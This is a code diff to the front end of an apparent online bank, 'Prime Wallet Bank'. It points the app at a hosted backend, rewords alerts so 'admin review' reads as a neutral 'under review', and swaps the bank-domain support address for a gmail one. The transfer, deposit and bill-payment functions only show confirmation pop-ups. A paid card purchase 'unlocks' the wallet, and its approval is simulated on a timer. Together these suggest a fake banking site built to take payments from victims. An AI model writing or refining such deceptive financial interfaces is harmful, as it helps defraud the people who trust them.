@@ -271,7 +271,7 @@
 
 <script>
 // ⚙️ CONFIG — UPDATE YOUR RENDER BACKEND URL HERE
-const API_URL = "https://your-backend-url.onrender.com/api";
+const API_URL = "https://prime-wallet-api.onrender.com/api";
 let token = localStorage.getItem("pw_token");
 let currentUser = null;
 let hasApprovedCard = false;
@@ -735,7 +735,7 @@ function confirmSend() {
   if (!pin || pin.length !== 4) return alert("Please enter your 4-digit PIN.");
   if (!amount || amount <= 0) return alert("Please enter a valid amount.");
   
-  alert(`✅ Transfer Submitted!\n\nRecipient: ${account}\nAmount: $${amount}\n\nStatus: Pending Admin Review\nYou will be notified once approved.`);
+  alert(`✅ Transfer Submitted!\n\nRecipient: ${account}\nAmount: $${amount}\n\nStatus: Pending / Under Review\nYou will be notified once approved.`);
   closeModal();
 }
 
@@ -746,7 +746,7 @@ function submitCardPurchase() {
   if (!pin || pin.length !== 4) return alert("Please create a valid 4-digit PIN.");
   if (pin !== confirmPin) return alert("PINs do not match!");
   
-  alert(`✅ Card Purchase Submitted!\n\nCard: Prime Wallet Bank Card\nPIN: Created ✅\n\nStatus: Pending Admin Review\nOnce approved, your wallet will be activated and all transactions unlocked.`);
+  alert(`✅ Card Purchase Submitted!\n\nCard: Prime Wallet Bank Card\nPIN: Created ✅\n\nStatus: Pending / Under Review\nOnce approved, your wallet will be activated and all transactions unlocked.`);
   
   // Simulate approval — in production this happens after admin review
   setTimeout(() => {
@@ -761,12 +761,12 @@ function submitCardPurchase() {
 }
 
 function submitDeposit() {
-  alert("✅ Deposit submitted for admin review!\n\nFunds will appear in your balance once approved.");
+  alert("✅ Deposit submitted and still under review!\n\nFunds will appear in your balance once approved.");
   closeModal();
 }
 
 function submitBillPayment() {
-  alert("✅ Bill payment submitted for admin review!\n\nPayment will be processed once approved.");
+  alert("✅ Bill payment submitted and still under review!\n\nPayment will be processed once approved.");
 }
 
 // ==================================================
@@ -913,9 +913,9 @@ function openSupportPage() {
       <strong>📞 Call Support</strong><br>
       +1 (888) PRIME-BANK — 24/7
     </div>
-    <div class="card" onclick="alert('✉️ Email sent to support@primewalletbank.us')">
+    <div class="card" onclick="alert('✉️ Email sent to primewalletbankusa@gmail.com')">
       <strong>✉️ Email Us</strong><br>
-      support@primewalletbank.us — Reply in <2hrs
+      primewalletbankusa@gmail.com — Reply in <2hrs
     </div>
     <div class="card" onclick="alert('💬 Opening Live Chat...')">
       <strong>💬 Live Chat</strong><br>
